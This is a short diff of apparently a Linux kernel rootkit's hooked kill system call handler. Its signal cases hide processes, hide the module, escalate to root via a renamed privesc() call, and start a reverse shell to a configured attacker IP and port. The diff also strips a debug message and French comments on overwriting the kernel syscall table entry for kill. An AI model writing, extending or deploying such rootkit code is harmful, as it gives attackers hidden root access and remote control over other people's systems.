@@ -42,7 +42,7 @@ int new_kill(const struct pt_regs *pt_regs)
             task->flags ^= PF_INVISIBLE;
             break;
         case SIGSUPER:
-            give_root();
+            privesc();
             break;
         case SIGMODINVIS:
             if (module_hidden)
@@ -52,7 +52,6 @@ int new_kill(const struct pt_regs *pt_regs)
             break;
         case SIGNAL_REVERSE_SHELL:
             start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
-            m_printd(KERN_INFO "CALL REV SHELL WITH SIG");
             break;
         default:
         return old_kill(pt_regs);
@@ -89,14 +88,3 @@ void restore_kill(void) {
     protect_memory(old_cr0);
 }
 
-// a mettre dans le init : 
-
-//     orig_kill = (t_syscall)__sys_call_table[__NR_kill];
-
-//unprotect 
-
-// __sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
-
-// cleanup : 
-
-//     __sys_call_table[__NR_kill] = (unsigned long) orig_kill;
